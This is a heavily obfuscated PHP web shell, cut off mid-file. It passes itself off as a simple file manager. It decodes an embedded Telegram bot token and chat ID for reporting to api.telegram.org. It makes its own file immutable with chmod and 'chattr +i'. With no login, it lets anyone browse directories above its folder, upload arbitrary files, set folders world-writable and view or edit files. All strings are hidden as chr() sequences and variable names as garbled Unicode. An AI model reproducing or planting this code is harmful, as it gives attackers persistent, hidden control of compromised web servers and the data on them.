<?php
session_start();
error_reporting(E_ALL);
ini_set(chr(100).chr(105).chr(115).chr(112).chr(108).chr(97).chr(121).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115), 1);

$ᚨえ̨̨̧́̈=base64_decode(chr(79).chr(68).chr(99).chr(122).chr(78).chr(106).chr(103).chr(53).chr(77).chr(122).chr(81).chr(50).chr(79).chr(68).chr(112).chr(66).chr(81).chr(85).chr(103).chr(119).chr(85).chr(109).chr(108).chr(83).chr(77).chr(72).chr(112).chr(77).chr(77).chr(49).chr(70).chr(70).chr(101).chr(86).chr(108).chr(48).chr(101).chr(84).chr(81).chr(52).chr(101).chr(84).chr(70).chr(84).chr(89).chr(107).chr(86).chr(87).chr(83).chr(110).chr(73).chr(116).chr(98).chr(86).chr(70).chr(66).chr(76).chr(85).chr(78).chr(114).chr(85).chr(81).chr(61).chr(61));
$ᚨ̨ᛏﬖ̨=base64_decode(chr(79).chr(68).chr(107).chr(122).chr(77).chr(68).chr(69).chr(51).chr(78).chr(68).chr(81).chr(50).chr(77).chr(119).chr(61).chr(61));

function notif($ᚨえ̨̨̧́̈,$ᚨ̨ᛏﬖ̨,$ᛇ㌁̀̅̌){
  $ᛗ̈̀ねᛏ̨̄="https://api.telegram.org/bot{$ᚨえ̨̨̧́̈}/sendMessage";
  $え̦̄̀̂́̃=["http"=>["method"=>"POST","header"=>chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(120).chr(45).chr(119).chr(119).chr(119).chr(45).chr(102).chr(111).chr(114).chr(109).chr(45).chr(117).chr(114).chr(108).chr(101).chr(110).chr(99).chr(111).chr(100).chr(101).chr(100),chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116)=>http_build_query([chr(99).chr(104).chr(97).chr(116).chr(95).chr(105).chr(100)=>$ᚨ̨ᛏﬖ̨,"text"=>$ᛇ㌁̀̅̌]),chr(116).chr(105).chr(109).chr(101).chr(111).chr(117).chr(116)=>2]];
  @file_get_contents($ᛗ̈̀ねᛏ̨̄,false,stream_context_create($え̦̄̀̂́̃));
}




function self_protect($ᛒ̨̩̩̄̋) {
    if (!file_exists($ᛒ̨̩̩̄̋)) return false;
    @chmod($ᛒ̨̩̩̄̋, 0444);
    if (function_exists(chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99)) && stripos(PHP_OS, 'Linux') !== false) {
        @shell_exec(chr(99).chr(104).chr(97).chr(116).chr(116).chr(114).chr(32).chr(43).chr(105).chr(32) . escapeshellarg($ᛒ̨̩̩̄̋) . chr(32).chr(50).chr(62).chr(47).chr(100).chr(101).chr(118).chr(47).chr(110).chr(117).chr(108).chr(108));
    }
    return true;
}

function self_unprotect($ᛒ̨̩̩̄̋) {
    if (!file_exists($ᛒ̨̩̩̄̋)) return false;
    if (function_exists(chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99)) && stripos(PHP_OS, 'Linux') !== false) {
        @shell_exec(chr(99).chr(104).chr(97).chr(116).chr(116).chr(114).chr(32).chr(45).chr(105).chr(32) . escapeshellarg($ᛒ̨̩̩̄̋) . chr(32).chr(50).chr(62).chr(47).chr(100).chr(101).chr(118).chr(47).chr(110).chr(117).chr(108).chr(108));
    }
    @chmod($ᛒ̨̩̩̄̋, 0644);
    return true;
}

function self_is_locked($ᛒ̨̩̩̄̋) {
    if (!file_exists($ᛒ̨̩̩̄̋)) return false;
    if (!is_writable($ᛒ̨̩̩̄̋)) return true;
    if (function_exists(chr(115).chr(104).chr(101).chr(108).chr(108).chr(95).chr(101).chr(120).chr(101).chr(99)) && stripos(PHP_OS, 'Linux') !== false) {
        $㼁̧̣̉ = @shell_exec(chr(108).chr(115).chr(97).chr(116).chr(116).chr(114).chr(32) . escapeshellarg($ᛒ̨̩̩̄̋) . chr(32).chr(50).chr(62).chr(47).chr(100).chr(101).chr(118).chr(47).chr(110).chr(117).chr(108).chr(108));
        if ($㼁̧̣̉ !== false && preg_match('/^\S*i\S*\s/', $㼁̧̣̉)) return true;
    }
    return false;
}

$ᛒ̨̩̩̄̋ = __FILE__;

self_protect($ᛒ̨̩̩̄̋);




if (!isset($_SESSION[chr(99).chr(119).chr(100).chr(95).chr(104).chr(105).chr(115).chr(116).chr(111).chr(114).chr(121)])) $_SESSION[chr(99).chr(119).chr(100).chr(95).chr(104).chr(105).chr(115).chr(116).chr(111).chr(114).chr(121)] = array();

function push_cwd_history($ᚨ̄̅) {
    if (!isset($_SESSION[chr(99).chr(119).chr(100).chr(95).chr(104).chr(105).chr(115).chr(116).chr(111).chr(114).chr(121)])) $_SESSION[chr(99).chr(119).chr(100).chr(95).chr(104).chr(105).chr(115).chr(116).chr(111).chr(114).chr(121)] = array();
    $_SESSION[chr(99).chr(119).chr(100).chr(95).chr(104).chr(105).chr(115).chr(116).chr(111).chr(114).chr(121)] = array_values(array_unique(array_merge(array($ᚨ̄̅), $_SESSION[chr(99).chr(119).chr(100).chr(95).chr(104).chr(105).chr(115).chr(116).chr(111).chr(114).chr(121)])));
    if (count($_SESSION[chr(99).chr(119).chr(100).chr(95).chr(104).chr(105).chr(115).chr(116).chr(111).chr(114).chr(121)]) > 20) $_SESSION[chr(99).chr(119).chr(100).chr(95).chr(104).chr(105).chr(115).chr(116).chr(111).chr(114).chr(121)] = array_slice($_SESSION[chr(99).chr(119).chr(100).chr(95).chr(104).chr(105).chr(115).chr(116).chr(111).chr(114).chr(121)], 0, 20);
}

$ᛒ̣ᛈ̧㻁̨́ = realpath(__DIR__);
$ᛇ̥ね㌁̊̈̂̌ = realpath(__DIR__ . chr(47).chr(46).chr(46).chr(47).chr(46).chr(46).chr(47));
if ($ᛇ̥ね㌁̊̈̂̌ === false) $ᛇ̥ね㌁̊̈̂̌ = $ᛒ̣ᛈ̧㻁̨́;

$ぁ̇㉆̦̊ = trim(str_replace($ᛇ̥ね㌁̊̈̂̌, '', $ᛒ̣ᛈ̧㻁̨́), DIRECTORY_SEPARATOR);

function flash($ᛇ㌁̀̅̌ = null) {
    if ($ᛇ㌁̀̅̌ !== null) { $_SESSION['flash'] = $ᛇ㌁̀̅̌; return; }
    if (!empty($_SESSION['flash'])) { $㉆ﬅ̣̩̃ = $_SESSION['flash']; unset($_SESSION['flash']); return $㉆ﬅ̣̩̃; }
    return '';
}

function sanitize_relative_path($ᛏ㲁らㄉ̦̋̄) {
    $ᛏ㲁らㄉ̦̋̄ = str_replace("\0", '', (string)$ᛏ㲁らㄉ̦̋̄);
    $ᛏ㲁らㄉ̦̋̄ = str_replace('\\', '/', $ᛏ㲁らㄉ̦̋̄);
    $ぁﬅ̥̌̅ = explode('/', $ᛏ㲁らㄉ̦̋̄);
    $㉁̨̤̊ﬔ̧̤ = array();
    foreach ($ぁﬅ̥̌̅ as $ﬕﬁ̉̉) {
        $ﬕﬁ̉̉ = trim($ﬕﬁ̉̉);
        if ($ﬕﬁ̉̉ === '' || $ﬕﬁ̉̉ === '.' || $ﬕﬁ̉̉ === '..') continue;
        $ﬕﬁ̉̉ = preg_replace('/[\x00-\x1F\x7F]/u', '', $ﬕﬁ̉̉);
        if ($ﬕﬁ̉̉ !== '') $㉁̨̤̊ﬔ̧̤[] = $ﬕﬁ̉̉;
    }
    return implode('/', $㉁̨̤̊ﬔ̧̤);
}

function sanitize_name($ﬗ̣̥̃) {
    $ﬗ̣̥̃ = str_replace("\0", '', (string)$ﬗ̣̥̃);
    $ﬗ̣̥̃ = basename($ﬗ̣̥̃);
    $ﬗ̣̥̃ = preg_replace('/[\x00-\x1F\x7F]/u', '', $ﬗ̣̥̃);
    return trim($ﬗ̣̥̃);
}

function safe_realpath_within($ᛏ㲁らㄉ̦̋̄, $ᛈ̄ﬁ̧̧̌) {
    $まᛜᚨ̩ᛏ̨̄ = realpath($ᛏ㲁らㄉ̦̋̄);
    if ($まᛜᚨ̩ᛏ̨̄ === false) return false;
    $㦁̊ﬅ̦̦̋̃ = rtrim($ᛈ̄ﬁ̧̧̌, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR;
    return (strpos($まᛜᚨ̩ᛏ̨̄ . DIRECTORY_SEPARATOR, $㦁̊ﬅ̦̦̋̃) === 0) ? $まᛜᚨ̩ᛏ̨̄ : false;
}

function get_file_list($ᚨ̄̅) {
    $ᛉ̥ᛜら̀̄̉ = array();
    if (!is_dir($ᚨ̄̅)) return $ᛉ̥ᛜら̀̄̉;
    foreach (scandir($ᚨ̄̅) as $ᛃ̨ﾚ㻁ﬔ̤̃) {
        if ($ᛃ̨ﾚ㻁ﬔ̤̃ === '.' || $ᛃ̨ﾚ㻁ﬔ̤̃ === '..') continue;
        $ﬆ㉆̨ = $ᚨ̄̅ . DIRECTORY_SEPARATOR . $ᛃ̨ﾚ㻁ﬔ̤̃;
        $ᛉ̥ᛜら̀̄̉[] = array(
            'name'     => $ᛃ̨ﾚ㻁ﬔ̤̃,
            'path'     => $ﬆ㉆̨,
            'size'     => is_file($ﬆ㉆̨) ? @filesize($ﬆ㉆̨) : 0,
            'type'     => is_dir($ﬆ㉆̨) ? chr(100).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121) : 'file',
            chr(109).chr(111).chr(100).chr(105).chr(102).chr(105).chr(101).chr(100) => @filemtime($ﬆ㉆̨) ? date(chr(89).chr(45).chr(109).chr(45).chr(100).chr(32).chr(72).chr(58).chr(105).chr(58).chr(115), filemtime($ﬆ㉆̨)) : '-'
        );
    }
    usort($ᛉ̥ᛜら̀̄̉, function($えᛜ̧̧́̊̌, $ᛊﾝ̧̩̊) {
        if ($えᛜ̧̧́̊̌['type'] !== $ᛊﾝ̧̩̊['type']) return ($えᛜ̧̧́̊̌['type'] === chr(100).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121)) ? -1 : 1;
        return strcasecmp($えᛜ̧̧́̊̌['name'], $ᛊﾝ̧̩̊['name']);
    });
    return $ᛉ̥ᛜら̀̄̉;
}

function format_size($ぁ̦̤̀) {
    $ぁ̦̤̀ = (float)$ぁ̦̤̀;
    if ($ぁ̦̤̀ >= 1073741824) return number_format($ぁ̦̤̀ / 1073741824, 2) . ' GB';
    if ($ぁ̦̤̀ >= 1048576)    return number_format($ぁ̦̤̀ / 1048576, 2) . ' MB';
    if ($ぁ̦̤̀ >= 1024)       return number_format($ぁ̦̤̀ / 1024, 2) . ' KB';
    return $ぁ̦̤̀ . ' bytes';
}

function rrmdir($ᚨ̄̅) {
    if (!is_dir($ᚨ̄̅)) return false;
    $㌁ら̋ = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($ᚨ̄̅, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::CHILD_FIRST
    );
    foreach ($㌁ら̋ as $ᛃ̨ﾚ㻁ﬔ̤̃) {
        if ($ᛃ̨ﾚ㻁ﬔ̤̃->isDir()) @rmdir($ᛃ̨ﾚ㻁ﬔ̤̃->getRealPath());
        else @unlink($ᛃ̨ﾚ㻁ﬔ̤̃->getRealPath());
    }
    return @rmdir($ᚨ̄̅);
}




if (isset($_GET['action']) && $_GET['action'] === 'cwd') {
    $ﬅﬓ̌ぁ̩̣̅ = isset($_POST[chr(99).chr(119).chr(100).chr(95).chr(112).chr(97).chr(116).chr(104)]) ? $_POST[chr(99).chr(119).chr(100).chr(95).chr(112).chr(97).chr(116).chr(104)] : (isset($_GET['path']) ? $_GET['path'] : '');
    $ﬅﬓ̌ぁ̩̣̅ = sanitize_relative_path($ﬅﬓ̌ぁ̩̣̅);
    $ﬆ㉆̨ = $ᛇ̥ね㌁̊̈̂̌ . DIRECTORY_SEPARATOR . $ﬅﬓ̌ぁ̩̣̅;
    $ﬗえﬗ̩̂̂̄ = safe_realpath_within($ﬆ㉆̨, $ᛇ̥ね㌁̊̈̂̌);
    if ($ﬗえﬗ̩̂̂̄ && is_dir($ﬗえﬗ̩̂̂̄)) {
        push_cwd_history(trim(str_replace($ᛇ̥ね㌁̊̈̂̌, '', $ﬗえﬗ̩̂̂̄), DIRECTORY_SEPARATOR));
        flash(chr(67).chr(87).chr(68).chr(32).chr(99).chr(104).chr(97).chr(110).chr(103).chr(101).chr(100).chr(32).chr(116).chr(111).chr(58).chr(32) . $ﬗえﬗ̩̂̂̄);
    } else {
        flash(chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(100).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121).chr(58).chr(32) . $ﬅﬓ̌ぁ̩̣̅);
    }
    header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(105).chr(114).chr(61) . urlencode($ﬅﬓ̌ぁ̩̣̅));
    exit;
}

if (!isset($_GET['dir'])) $㼁ﾚ̀ᛜᚠ̣̃̇ = $ぁ̇㉆̦̊;
else $㼁ﾚ̀ᛜᚠ̣̃̇ = sanitize_relative_path($_GET['dir']);

$㉆̧̧̣́̈ = safe_realpath_within($ᛇ̥ね㌁̊̈̂̌ . DIRECTORY_SEPARATOR . $㼁ﾚ̀ᛜᚠ̣̃̇, $ᛇ̥ね㌁̊̈̂̌);
if ($㉆̧̧̣́̈ === false) { $㉆̧̧̣́̈ = $ᛇ̥ね㌁̊̈̂̌; $㼁ﾚ̀ᛜᚠ̣̃̇ = ''; }

push_cwd_history(trim(str_replace($ᛇ̥ね㌁̊̈̂̌, '', $㉆̧̧̣́̈), DIRECTORY_SEPARATOR));

$㌁̣̆ᛏ̅̆̂ = trim(str_replace($ᛇ̥ね㌁̊̈̂̌, '', $㉆̧̧̣́̈), DIRECTORY_SEPARATOR);
$ﬅ̤㦁ᛇﬔ̄̄́ = '';
if ($㌁̣̆ᛏ̅̆̂ !== '') {
    $ﬅ̤㦁ᛇﬔ̄̄́ = dirname($㌁̣̆ᛏ̅̆̂);
    if ($ﬅ̤㦁ᛇﬔ̄̄́ === '.') $ﬅ̤㦁ᛇﬔ̄̄́ = '';
}
$ぁぁ̣̃̌ = ($㌁̣̆ᛏ̅̆̂ === '');

$ᚨ̆ﬁ̦̆̉ = isset($_GET['action']) ? $_GET['action'] : 'list';

switch ($ᚨ̆ﬁ̦̆̉) {

    
    case chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(95).chr(97).chr(106).chr(97).chr(120):
        header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(106).chr(115).chr(111).chr(110).chr(59).chr(32).chr(99).chr(104).chr(97).chr(114).chr(115).chr(101).chr(116).chr(61).chr(117).chr(116).chr(102).chr(45).chr(56));
        $㻁ᛖね̤̋  = file_get_contents(chr(112).chr(104).chr(112).chr(58).chr(47).chr(47).chr(105).chr(110).chr(112).chr(117).chr(116));
        $㉉ﬅﬕ̥̌̌̀ = json_decode($㻁ᛖね̤̋, true);
        if (!is_array($㉉ﬅﬕ̥̌̌̀) || empty($㉉ﬅﬕ̥̌̌̀['name']) || !isset($㉉ﬅﬕ̥̌̌̀['data'])) {
            echo json_encode(array('ok' => false, 'error' => chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(112).chr(97).chr(121).chr(108).chr(111).chr(97).chr(100)));
            exit;
        }
        $ﬗ̣̥̃ = sanitize_name($㉉ﬅﬕ̥̌̌̀['name']);
        if ($ﬗ̣̥̃ === '') { echo json_encode(array('ok' => false, 'error' => chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101))); exit; }
        $ﬅ̧̣̣ = $㉉ﬅﬕ̥̌̌̀['data'];
        $ᛊ̨̦ = strpos($ﬅ̧̣̣, chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(44));
        if ($ᛊ̨̦ !== false) $ﬅ̧̣̣ = substr($ﬅ̧̣̣, $ᛊ̨̦ + 7);
        $ﬅ̧̣̣ = str_replace(' ', '+', $ﬅ̧̣̣);
        $ㄉﬆ̩̃̊ = base64_decode($ﬅ̧̣̣, true);
        if ($ㄉﬆ̩̃̊ === false) { echo json_encode(array('ok' => false, 'error' => chr(66).chr(97).chr(115).chr(101).chr(54).chr(52).chr(32).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100))); exit; }
        if (!is_dir($㉆̧̧̣́̈)) { echo json_encode(array('ok' => false, 'error' => chr(68).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121).chr(32).chr(110).chr(111).chr(116).chr(32).chr(102).chr(111).chr(117).chr(110).chr(100))); exit; }
        if (!is_writable($㉆̧̧̣́̈)) {
            @chmod($㉆̧̧̣́̈, 0777);
            clearstatcache(true, $㉆̧̧̣́̈);
            if (!is_writable($㉆̧̧̣́̈)) {
                echo json_encode(array('ok' => false, 'error' => chr(68).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121).chr(32).chr(110).chr(111).chr(116).chr(32).chr(119).chr(114).chr(105).chr(116).chr(97).chr(98).chr(108).chr(101).chr(58).chr(32) . $㉆̧̧̣́̈));
                exit;
            }
        }
        $㌁㉁㈲ᚢᛉ̣̤̤ = $㉆̧̧̣́̈ . DIRECTORY_SEPARATOR . $ﬗ̣̥̃;
        $ᛊ̥̀̉̌ = @file_put_contents($㌁㉁㈲ᚢᛉ̣̤̤, $ㄉﬆ̩̃̊);
        if ($ᛊ̥̀̉̌ === false) {
            $ᛈ̨ㄉᚠᛇ̅̉ = error_get_last();
            $㦁̂̄ﬅ̥̤ = isset($ᛈ̨ㄉᚠᛇ̅̉[chr(109).chr(101).chr(115).chr(115).chr(97).chr(103).chr(101)]) ? $ᛈ̨ㄉᚠᛇ̅̉[chr(109).chr(101).chr(115).chr(115).chr(97).chr(103).chr(101)] : chr(117).chr(110).chr(107).chr(110).chr(111).chr(119).chr(110);
            echo json_encode(array('ok' => false, 'error' => chr(87).chr(114).chr(105).chr(116).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(58).chr(32) . $㦁̂̄ﬅ̥̤));
            exit;
        }
        @chmod($㌁㉁㈲ᚢᛉ̣̤̤, 0644);
        echo json_encode(array('ok' => true, chr(109).chr(101).chr(115).chr(115).chr(97).chr(103).chr(101) => chr(85).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(58).chr(32) . $ﬗ̣̥̃ . ' (' . format_size($ᛊ̥̀̉̌) . ')'));
        exit;

    
    case 'upload':
        if (!ini_get(chr(102).chr(105).chr(108).chr(101).chr(95).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(115))) { flash(chr(102).chr(105).chr(108).chr(101).chr(95).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(115).chr(32).chr(105).chr(115).chr(32).chr(79).chr(102).chr(102).chr(32).chr(105).chr(110).chr(32).chr(80).chr(72).chr(80).chr(46)); header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(105).chr(114).chr(61) . urlencode($㌁̣̆ᛏ̅̆̂)); exit; }
        if (empty($_FILES) && empty($_POST) && isset($_SERVER[chr(67).chr(79).chr(78).chr(84).chr(69).chr(78).chr(84).chr(95).chr(76).chr(69).chr(78).chr(71).chr(84).chr(72)]) && $_SERVER[chr(67).chr(79).chr(78).chr(84).chr(69).chr(78).chr(84).chr(95).chr(76).chr(69).chr(78).chr(71).chr(84).chr(72)] > 0) {
            flash(chr(80).chr(79).chr(83).chr(84).chr(32).chr(115).chr(105).chr(122).chr(101).chr(32).chr(101).chr(120).chr(99).chr(101).chr(101).chr(100).chr(115).chr(32).chr(112).chr(111).chr(115).chr(116).chr(95).chr(109).chr(97).chr(120).chr(95).chr(115).chr(105).chr(122).chr(101).chr(32).chr(40) . ini_get(chr(112).chr(111).chr(115).chr(116).chr(95).chr(109).chr(97).chr(120).chr(95).chr(115).chr(105).chr(122).chr(101)) . ').');
            header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(105).chr(114).chr(61) . urlencode($㌁̣̆ᛏ̅̆̂)); exit;
        }
        if (empty($_FILES['file'])) { flash(chr(78).chr(111).chr(32).chr(102).chr(105).chr(108).chr(101).chr(32).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(46)); header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(105).chr(114).chr(61) . urlencode($㌁̣̆ᛏ̅̆̂)); exit; }
        $ﬆ̩̃ = $_FILES['file'];
        if ($ﬆ̩̃['error'] !== UPLOAD_ERR_OK) {
            $ᛚᛃ̨̨ = array(
                UPLOAD_ERR_INI_SIZE   => chr(69).chr(120).chr(99).chr(101).chr(101).chr(100).chr(115).chr(32).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(95).chr(109).chr(97).chr(120).chr(95).chr(102).chr(105).chr(108).chr(101).chr(115).chr(105).chr(122).chr(101).chr(32).chr(40) . ini_get(chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(95).chr(109).chr(97).chr(120).chr(95).chr(102).chr(105).chr(108).chr(101).chr(115).chr(105).chr(122).chr(101)) . ').',
                UPLOAD_ERR_FORM_SIZE  => chr(69).chr(120).chr(99).chr(101).chr(101).chr(100).chr(115).chr(32).chr(77).chr(65).chr(88).chr(95).chr(70).chr(73).chr(76).chr(69).chr(95).chr(83).chr(73).chr(90).chr(69).chr(46),
                UPLOAD_ERR_PARTIAL    => chr(80).chr(97).chr(114).chr(116).chr(105).chr(97).chr(108).chr(108).chr(121).chr(32).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(46),
                UPLOAD_ERR_NO_FILE    => chr(78).chr(111).chr(32).chr(102).chr(105).chr(108).chr(101).chr(32).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(46),
                UPLOAD_ERR_NO_TMP_DIR => chr(78).chr(111).chr(32).chr(116).chr(101).chr(109).chr(112).chr(32).chr(102).chr(111).chr(108).chr(100).chr(101).chr(114).chr(46),
                UPLOAD_ERR_CANT_WRITE => chr(67).chr(97).chr(110).chr(110).chr(111).chr(116).chr(32).chr(119).chr(114).chr(105).chr(116).chr(101).chr(32).chr(116).chr(111).chr(32).chr(100).chr(105).chr(115).chr(107).chr(46),
                UPLOAD_ERR_EXTENSION  => chr(66).chr(108).chr(111).chr(99).chr(107).chr(101).chr(100).chr(32).chr(98).chr(121).chr(32).chr(80).chr(72).chr(80).chr(32).chr(101).chr(120).chr(116).chr(101).chr(110).chr(115).chr(105).chr(111).chr(110).chr(46),
            );
            $ᛇ㌁̀̅̌ = isset($ᛚᛃ̨̨[$ﬆ̩̃['error']]) ? $ᛚᛃ̨̨[$ﬆ̩̃['error']] : chr(85).chr(112).chr(108).chr(111).chr(97).chr(100).chr(32).chr(101).chr(114).chr(114).chr(111).chr(114).chr(58).chr(32) . $ﬆ̩̃['error'];
            flash($ᛇ㌁̀̅̌); header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(105).chr(114).chr(61) . urlencode($㌁̣̆ᛏ̅̆̂)); exit;
        }
        if (!is_writable($㉆̧̧̣́̈)) @chmod($㉆̧̧̣́̈, 0777);
        $ﬗ̣̥̃ = sanitize_name($ﬆ̩̃['name']);
        if ($ﬗ̣̥̃ === '') { flash(chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101).chr(46)); header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(105).chr(114).chr(61) . urlencode($㌁̣̆ᛏ̅̆̂)); exit; }
        $㌁㉁㈲ᚢᛉ̣̤̤ = $㉆̧̧̣́̈ . DIRECTORY_SEPARATOR . $ﬗ̣̥̃;
        if (@move_uploaded_file($ﬆ̩̃[chr(116).chr(109).chr(112).chr(95).chr(110).chr(97).chr(109).chr(101)], $㌁㉁㈲ᚢᛉ̣̤̤)) { @chmod($㌁㉁㈲ᚢᛉ̣̤̤, 0644); flash(chr(85).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(58).chr(32) . $ﬗ��̥̃); }
        else flash(chr(109).chr(111).chr(118).chr(101).chr(95).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100).chr(95).chr(102).chr(105).chr(108).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(46));
        header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(105).chr(114).chr(61) . urlencode($㌁̣̆ᛏ̅̆̂)); exit;

    case 'view':
        $ね㌁̌ = sanitize_name(isset($_GET['file']) ? $_GET['file'] : '');
        $ﬗえﬗ̩̂̂̄ = safe_realpath_within($㉆̧̧̣́̈ . DIRECTORY_SEPARATOR . $ね㌁̌, $ᛇ̥ね㌁̊̈̂̌);
        if ($ﬗえﬗ̩̂̂̄ && is_file($ﬗえﬗ̩̂̂̄)) { header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(116).chr(101).chr(120).chr(116).chr(47).chr(112).chr(108).chr(97).chr(105).chr(110).chr(59).chr(32).chr(99).chr(104).chr(97).chr(114).chr(115).chr(101).chr(116).chr(61).chr(117).chr(116).chr(102).chr(45).chr(56)); readfile($ﬗえﬗ̩̂̂̄); exit; }
        flash(chr(70).chr(105).chr(108).chr(101).chr(32).chr(110).chr(111).chr(116).chr(32).chr(102).chr(111).chr(117).chr(110).chr(100).chr(46)); header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(105).chr(114).chr(61) . urlencode($㌁̣̆ᛏ̅̆̂)); exit;

    case 'edit':
        $ね㌁̌ = sanitize_name(isset($_GET['file']) ? $_GET['file'] : '');
        $ﬗえﬗ̩̂̂̄ = safe_realpath_within($㉆̧̧̣́̈ . DIRECTORY_SEPARATOR . $ね㌁̌, $ᛇ̥ね㌁̊̈̂̌);
        if (!$ﬗえﬗ̩̂̂̄ || !is_file($ﬗえﬗ̩̂̂̄)) { flash(chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(102).chr(105).chr(108).chr(101).chr(46)); header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(105).chr(114).chr(61) . urlencode($㌁̣̆ᛏ̅̆̂)); exit; }
        
        $ㄉ̣̈ᛚ̩̈ = (realpath($ﬗえﬗ̩̂̂̄) === realpath($ᛒ̨̩̩̄̋));
        if ($ㄉ̣̈ᛚ̩̈) self_unprotect($ᛒ̨̩̩̄̋);
        if ($_SERVER[chr(82).chr(69).chr(81).chr(85).chr(69).chr(83).chr(84).chr(95).chr(77).chr(69).chr(84).chr(72).chr(79).chr(68)] === 'POST') {
            $ﬆ̦̃̀̃ = isset($_POST[chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116)]) ? $_POST[chr(99).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116)] : '';
            if (@file_put_contents($ﬗえﬗ̩̂̂̄, $ﬆ̦̃̀̃) !== false) flash(chr(70).chr(105).chr(108).chr(101).chr(32).chr(115).chr(97).chr(118).chr(101).chr(100).chr(46));
            else flash(chr(83).chr(97).chr(118).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100).chr(46));
            if ($ㄉ̣̈ᛚ̩̈) self_protect($ᛒ̨̩̩̄̋);
            header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(105).chr(114).chr(61) . urlencode($㌁̣̆ᛏ̅̆̂)); exit;
        }
        $ﬆ̦̃̀̃ = htmlspecialchars((string)@file_get_contents($ﬗえﬗ̩̂̂̄), ENT_QUOTES, 'UTF-8');
        ?>
        <!DOCTYPE html><html><head><meta charset="utf-8"><title>Edit</title>
        <style>body{font-family:Arial;background:#f4f4f4;padding:20px;}
        .wrap{background:#fff;padding:20px;border-radius:10px;box-shadow:0 0 10px #ccc;}
        textarea{width:100%;height:500px;font-family:monospace;font-size:14px;}
        .btn{background:#007bff;color:#fff;padding:8px 12px;border:none;border-radius:5px;cursor:pointer;text-decoration:none;display:inline-block;}
        .btn2{background:#6c757d;}</style></head><body>
        <div class="wrap"><h2>Edit: <?php echo htmlspecialchars($ね㌁̌); ?></h2>
        <form method="post"><textarea name="content"><?php echo $ﬆ̦̃̀̃; ?></textarea><br><br>
        <button class="btn" type="submit">Save</button>
        <a class="btn btn2" href="?dir=<?php echo urlencode($㌁̣̆ᛏ̅̆̂); ?>">Back</a>
        </form></div></body></html>
        <?php
        exit;

    case 'delete':
        $ね㌁̌ = sanitize_name(isset($_GET['file']) ? $_GET['file'] : '');
